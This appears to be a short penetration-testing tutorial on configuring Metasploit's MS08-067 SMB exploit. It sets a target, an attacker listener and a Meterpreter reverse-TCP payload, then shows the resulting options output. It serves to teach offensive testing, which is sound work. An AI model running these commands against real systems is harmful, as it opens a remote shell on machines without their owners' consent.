Exploit Configuration

Setting Up Your Attack Parameters

Defining Target and Listener Details

set RHOSTS 192.168.1.105
set LHOST 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.168.1.105    yes       The target address range or CIDR identifier
   RPORT    445              yes       The SMB service port (TCP)

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   LHOST     192.168.1.100    yes       The listen address (attacker IP)
   LPORT     4444             yes       The listen port
Key Takeaway

Properly setting `RHOSTS` (target IP), `LHOST` (attacker IP), and selecting a compatible `PAYLOAD` are essential for a successful exploit.

Critical Options Explained

  • RHOSTS: The IP address of the remote target machine you are attacking.
  • LHOST: Your local IP address, where Metasploit will listen for the reverse shell.
  • PAYLOAD: The malicious code that will run on the target after exploitation, providing access.
  • show options: Command to review all current settings and identify required parameters.
Common Mistake

Forgetting to set `LHOST` to your attacking machine's IP, which prevents the reverse shell from connecting back.
